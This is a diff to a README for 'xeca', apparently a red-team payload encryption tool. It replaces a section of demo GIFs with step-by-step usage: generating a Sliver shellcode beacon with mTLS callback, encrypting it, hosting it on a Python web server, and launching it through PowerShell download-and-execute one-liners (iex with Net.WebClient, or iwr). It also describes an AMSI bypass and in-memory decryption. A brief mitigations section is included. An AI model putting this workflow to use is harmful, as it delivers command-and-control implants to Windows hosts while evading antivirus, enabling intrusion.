@@ -35,22 +35,16 @@ cargo build
 ## Mitigations
 If users must have access to programs such as powershell.exe, consider minimising security risks with [Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7) and [PowerShell Logging](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7). Application control policies can be deployed via a whitelisting technology such as [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview).
 
-## Examples
-### Covenant
-[Covenant](https://github.com/cobbr/Covenant) .NET assembly donut payload.
-![gif](https://github.com/postrequest/storage/blob/master/xeca/covenant.gif?raw=true)
-
-### Empire
-[Empire](https://github.com/bc-security/empire) PowerShell payload.
-![gif](https://github.com/postrequest/storage/blob/master/xeca/empire.gif?raw=true)
-
-### Merlin
-[Merlin](https://github.com/Ne0nd0g/merlin) DLL payload.
-![gif](https://github.com/postrequest/storage/blob/master/xeca/merlin.gif?raw=true)
-
+## Usage
 ### Sliver
-[Sliver](https://github.com/BishopFox/sliver) Shellcode payload.
-![gif](https://github.com/postrequest/storage/blob/master/xeca/sliver.gif?raw=true)
+1. Generate a shellcode beacon -> generate beacon --format shellcode --os windows --mtls <IP>
+2. Use xeca to encrypt the payload -> xeca shellcode --shellcode <shellcode>.bin --url http://<pythonhttpserver>
+3. Create a python http server with the port that you provided to xeca -> python -m http.server 8080
+4. Use one of the following ways to run the payload:
+    - Fileless -> iex(New-Object Net.WebClient).DownloadString("http://<pythonhttpserver>/launch.txt")
+    - Run from disk -> iwr "http://<pythonhttpserver>" -OutFile launch.txt; iex(cat .\launch.txt)
+
+The launch.txt file contains the encrypted payload, it will first run an amsi bypass, and then it will load the encrypted payload, after that it will call back to the python server and grab the "safe.txt" file which will decrypt the payload in memory.
 
 ## Acknowledgements
 This tool would not be possible without the sharing of knowledge and information. Ideas, snippets and code from the following authors should be acknowledged:  
